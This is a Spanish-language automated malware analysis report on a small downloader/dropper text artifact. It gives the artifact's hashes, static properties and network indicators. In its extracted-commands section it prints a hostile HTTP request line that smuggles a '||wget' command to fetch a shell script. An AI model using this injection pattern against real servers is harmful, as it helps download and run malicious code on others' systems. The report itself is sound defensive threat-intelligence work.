# 🧬 Payload Analysis

`89467fdc956617fa5e76cb26a11fe16be46d4b0507124172c51443fceb7f9d8b`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 156 B. La evidencia estática disponible identifica capacidad de descarga remota. Se observaron o extrajeron 2 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:30:16.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `89467fdc956617fa5e76cb26a11fe16be46d4b0507124172c51443fceb7f9d8b`
- **SHA1:** `daf0743534e8b00dca2b7f5da7de8029668d0038`
- **MD5:** `8f36868f295ce55ccf04c39c0c7f1d54`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 156 B |
| Entropía | 5.2 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /rondo.bmv.sh%7C%7Cwget HTTP/1.1
User-Agent: curl/7.73.0
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 204.10.194.XXX | static_analysis |
| command | GET /rondo.bmv.sh%7C%7Cwget HTTP/1.1 | strings |
| command | User-Agent: curl/7.73.0 | strings |
| hash | 89467fdc956617fa5e76cb26a11fe16be46d4b0507124172c51443fceb7f9d8b | static_analysis |
| ip | [internal-ip-redacted] | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
